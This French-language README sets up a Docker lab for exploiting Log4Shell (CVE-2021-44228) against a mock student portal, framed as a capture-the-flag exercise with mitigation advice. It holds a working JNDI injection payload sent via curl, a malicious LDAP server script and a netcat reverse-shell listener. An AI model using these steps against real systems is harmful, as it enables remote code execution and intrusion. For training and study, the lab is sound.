# Log4Shell : **Setup and Exploitation Guide**

Ce projet est conçu pour démontrer et comprendre la vulnérabilité critique **Log4Shell** (CVE-2021-44228), qui affecte la bibliothèque **Apache Log4j 2**. Cette vulnérabilité permet à un attaquant d'exécuter du code arbitraire à distance en exploitant un mauvais traitement des messages de log.

L'application web utilisée pour cette démonstration est un **portail étudiant** de l'**ISFA (Institut de Science Financière et d'Assurances)**. Ce portail permet aux étudiants de télécharger leurs documents scolaires et de consulter leurs notes. Dans cette démonstration, nous allons exploiter cette application pour démontrer la vulnérabilité Log4Shell.

### **Qu’est-ce que Log4j ?**

Log4j est une bibliothèque open-source réputée, conçue pour gérer la journalisation des événements dans les applications Java. Créée par la fondation Apache, elle est largement utilisée par les développeurs pour enregistrer des messages, des exceptions et d’autres informations utiles sur le fonctionnement des applications.

### **Présentation de la vulnérabilité Log4j (Log4Shell)**

Log4Shell, identifiée par le CVE-2021-44228, est une vulnérabilité critique dans Log4j qui permet l’exécution de code à distance (Remote Code Execution ou RCE). Cette faille exploite la fonctionnalité de résolution des expressions JNDI (Java Naming and Directory Interface) dans Log4j, permettant à un attaquant de contrôler l’exécution du code sur le système cible. JNDI est une interface de programmation d’applications (API) que les applications Java utilisent pour accéder aux ressources hébergées sur des serveurs externes.

L’injection JNDI prend en charge différents types de répertoires, comme Domain Name Service (DNS), Lightweight Directory Access Protocol (LDAP) qui fournissent de précieuses informations comme les appareils réseau de l’organisation, Remote Method Invocation (RMI), et Inter-ORB Protocol (IIOP).

### Fonctionnement technique

- Lorsqu’une application utilise Log4j pour enregistrer une entrée utilisateur non validée contenant une expression JNDI malveillante, Log4j tente de résoudre cette expression en accédant à une ressource externe.
- L’attaquant peut alors fournir une URL pointant vers un serveur malveillant qui renvoie un payload exécutable.
- Une fois le payload chargé et exécuté, l’attaquant obtient un contrôle total du système.

## Prérequis

- **Docker** installé sur votre machine.

## **Setting Up the Application**

### Step 1 : Téléchargez les images Docker

Exécutez les commandes suivantes pour télécharger les images nécessaires depuis Docker Hub :

```
docker pull eddycaron/diable:log4shell_vuln_app
docker pull eddycaron/diable:log4shell_attacker
```

### Step 2 : Créez un réseau Docker

Créez un réseau Docker pour que les conteneurs puissent communiquer entre eux :

```
docker network create --driver bridge --subnet 172.25.0.0/16 net1
```

### Step 3 : Lancez l’application vulnérable

### **Sur Linux :**

```
docker run -d --name vuln_app --network net1 --ip 172.25.0.10 eddycaron/diable:log4shell_vuln_app
```

Accédez à l’application vulnérable via :

```
http://172.25.0.10:8080
```

### Sur Windows :

```
docker run -d --name vuln_app -p 8080:8080 --network net1 --ip 172.25.0.10 eddycaron/diable:log4shell_vuln_app
```

Accédez à l’application vulnérable via :

```
http://localhost:8080
```

### Step 4 : Lancez la machine attaquante

Exécutez le conteneur de l’attaquant :

```
docker run -d --name attacker --network net1 --ip 172.25.0.20 eddycaron/diable:log4shell_attacker
```

## Exploiter la vulnérabilité

### Initialisez l’environnement de l’attaquant

Connectez-vous au conteneur de l’attaquant et lancez le script d’exploitation :

```
docker exec -it attacker bash
python3 exploit.py --userip 172.25.0.20 --webport 8000 --lport 9001
```

### Configurez un listener

Dans le conteneur de l’attaquant, lancez un listener avec Netcat :

```
docker exec -it attacker bash
nc -lvnp 9001
```

### Envoyez une requête malveillante

Envoyez une requête POST malveillante à l’application vulnérable :

```
docker exec -it attacker bash
curl -X POST -d "uname=\${jndi:ldap://172.25.0.20:1389/a}&password=blablaisfa" http://172.25.0.10:8080/login
```

### Observez le résultat

Dans le listener Netcat, vous recevrez une connexion depuis le serveur cible. Voici quelques commandes pour interagir avec le système compromis :

- **Afficher l'utilisateur actuel** :
    
    ```bash
    whoami
    ```
    
- **Afficher le répertoire de travail actuel** :
    
    ```bash
    pwd
    ```
    
- **Trouver le flag caché** :
    
    Explorez les répertoires Linux pour trouver le flag caché.
    

**Indice :**

Le flag est situé dans le répertoire contenant les utilisateurs de la machine. 😉

### Fonctionnement de `exploit.py`

Le fichier `exploit.py` agit comme un serveur LDAP malveillant. Voici ce qu'il fait :

1. Il écoute sur un port défini (8000) pour capturer les requêtes envoyées par l'application vulnérable.
2. Lorsque l’exploit est injectée dans l'application, elle déclenche une requête LDAP vers le serveur malveillant.
3. Le script envoie une réponse contenant un objet Java malveillant, ce qui exécute du code arbitraire sur le serveur ciblé.
4. Cette interaction permet d'établir une connexion avec le listener Netcat, établissant ainsi un accès non autorisé.

# **Impact**

- Exécution de code à distance (**RCE**) avec privilèges de l'application cible.
- Compromission complète des systèmes affectés.
- Mouvement latéral possible pour attaquer d'autres services internes.
- Exfiltration de données sensibles via des requêtes malveillantes.
- Déploiement de ransomwares ou de **crypto-miners** sur les serveurs.

# **Mitigation**

- **Mise à jour** vers Log4j **2.17.1** ou version ultérieure.
- **Désactiver JNDI Lookup** via la configuration (`log4j2.formatMsgNoLookups=true`).
- **Filtrer et surveiller** les journaux pour détecter les tentatives d’exploitation.
- **Mettre en place un WAF** avec des règles spécifiques pour bloquer les payloads malveillants.
- **Restreindre les connexions sortantes** pour empêcher l’accès aux serveurs malveillants.

## Avertissement

**L'utilisation de ce projet pour exploiter des systèmes sans autorisation est strictement interdite.** Assurez-vous de toujours avoir les droits nécessaires avant d'utiliser des outils de sécurité offensive.
